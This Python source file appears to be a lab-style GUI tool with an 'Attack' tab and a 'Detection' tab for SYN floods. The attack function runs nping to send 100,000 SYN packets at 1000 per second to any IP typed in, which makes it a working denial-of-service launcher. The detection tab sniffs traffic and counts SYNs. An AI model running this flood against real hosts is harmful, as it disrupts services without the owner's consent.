from Scanning.syn_detection import *
import subprocess


def launch_attack(target_ip):
    try:
        subprocess.run([
            "nping", "--tcp", "-p", "80", "--flags", "syn", "--rate", "1000", "--count", "100000", target_ip
        ], check=True)
    except subprocess.CalledProcessError as e:
        print("Attack failed:", e)

def main():
    root = tk.Tk()
    root.title("Packet Sniffer")

    # Create a notebook (tabbed interface)
    notebook = ttk.Notebook(root)
    notebook.pack(fill='both', expand=True)

    # Attack tab
    attack_tab = ttk.Frame(notebook)
    notebook.add(attack_tab, text='Attack')

    attack_label = ttk.Label(attack_tab, text="Enter Target IP Address:")
    attack_label.grid(row=0, column=0, padx=5, pady=5, sticky="e")

    attack_ip_entry = ttk.Entry(attack_tab)
    attack_ip_entry.grid(row=0, column=1, padx=5, pady=5)

    attack_button = ttk.Button(attack_tab, text="Launch Attack", command=lambda: launch_attack(attack_ip_entry.get()))
    attack_button.grid(row=1, column=0, columnspan=2, padx=5, pady=10)

    # Detection tab
    detection_tab = ttk.Frame(notebook)
    notebook.add(detection_tab, text='Detection')

    interface_label = ttk.Label(detection_tab, text="Select Interface:")
    interface_label.grid(row=0, column=0, padx=5, pady=5, sticky="e")

    interfaces = list(psutil.net_if_addrs().keys())
    interface_var = tk.StringVar(detection_tab)
    interface_dropdown = ttk.Combobox(detection_tab, textvariable=interface_var, values=interfaces, state="readonly")
    interface_dropdown.grid(row=0, column=1, padx=5, pady=5)

    ip_label = ttk.Label(detection_tab, text="Enter IP Address to Monitor:")
    ip_label.grid(row=1, column=0, padx=5, pady=5, sticky="e")

    ip_entry = ttk.Entry(detection_tab)
    ip_entry.grid(row=1, column=1, padx=5, pady=5)

    start_button = ttk.Button(detection_tab, text="Start Sniffing", command=lambda: start_sniffing(interface_var, ip_entry, packet_list, status_label))
    start_button.grid(row=2, column=0, padx=5, pady=10)

    stop_button = ttk.Button(detection_tab, text="Stop Sniffing", command=stop_sniffing)
    stop_button.grid(row=2, column=1, padx=5, pady=10)

    packet_frame = ttk.Frame(detection_tab)
    packet_frame.grid(row=3, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")

    packet_list = tk.Listbox(packet_frame, width=80, height=20)
    packet_list.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")

    scrollbar = ttk.Scrollbar(packet_frame, orient="vertical", command=packet_list.yview)
    scrollbar.grid(row=0, column=1, sticky="ns")
    packet_list.config(yscrollcommand=scrollbar.set)

    status_label = ttk.Label(detection_tab, text="")
    status_label.grid(row=4, column=0, columnspan=2, padx=5, pady=5)

    syn_count_label = ttk.Label(detection_tab, text="SYN Count: 0")
    syn_count_label.grid(row=5, column=0, columnspan=2, padx=5, pady=5)

    update_syn_count_label(syn_count_label)

    root.mainloop()

if __name__ == "__main__":
    main()
